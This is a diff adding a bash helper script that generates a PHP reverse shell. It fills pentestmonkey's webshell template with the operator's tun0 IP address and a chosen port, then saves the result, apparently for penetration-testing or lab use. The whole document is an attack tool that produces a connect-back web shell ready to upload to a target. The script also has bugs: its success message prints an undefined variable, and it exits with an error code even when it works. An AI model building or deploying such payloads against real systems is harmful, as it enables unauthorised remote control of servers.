@@ -1,0 +1,38 @@
+#!/bin/bash
+# https://github.com/Senwor
+
+# stderr Supression
+exec 2>/dev/null
+
+# Formats & Colors
+green='\e[92m'
+bold='\e[1m'
+reset='\e[0m'
+
+# php-reverse-shell Location (http://pentestmonkey.net/tools/web-shells/php-reverse-shell)
+shell=/usr/share/webshells/php/php-reverse-shell.php
+
+# sed Location
+sed=/usr/bin/sed
+
+# Interface Configuration
+interface='tun0'
+
+ip=$(ifconfig $interface | grep inet | cut -d " " -f10 | head -1)
+
+dir=$(pwd)
+
+echo 
+[ -z "$ip" ] && 
+echo -e "${green}Your interface ${bold}$interface ${reset}${green}was not found." &&
+echo &&
+exit 1 ||
+[ -z "$2" ] &&
+echo -e "${green}Usage: phpShell <port> <output>" &&
+echo &&
+exit 1 ||
+$sed -e "s@127.0.0.1@$ip@" -e "s@1234@$1@" $shell > $dir/$2 &&
+echo -e "${green}Your reverse shell has been saved to ${bold}$dir/$filename${reset}${green}."
+echo
+
+exit 1
